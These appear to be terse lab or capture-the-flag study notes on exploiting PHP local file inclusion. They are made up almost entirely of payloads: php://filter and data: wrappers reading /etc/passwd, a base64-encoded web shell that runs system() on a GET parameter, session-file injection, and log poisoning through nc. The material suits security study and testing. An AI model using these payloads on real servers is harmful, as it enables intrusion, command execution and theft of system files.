![[target files.png]]

https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

##### PHP Wrappers

* `php://filter/convert.base64-encode/resource=/etc/passwd`
* `data:text/plain,<?php%20phpinfo();%20?>`

![[php filter.png]]


![[file links.png]]
We will use the PHP code `<?php system($_GET['cmd']); echo 'Shell done!'; ?>` as our payload. The value of the payload, when encoded to base64, will be `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`



###### Session files
1. Inject `<?php echo phpinfo(); ?>` into session.
2. Access URL to execute the code:
`sessions.php?page=/var/lib/php/sessions/sess_[sessionID]`

###### Log poisoning
```php
$ nc MACHINE_IP 80      
<?php echo phpinfo(); ?>
```

Then using LFI access the log file.

##### LFI

`dataserver=file:///etc/passwd`
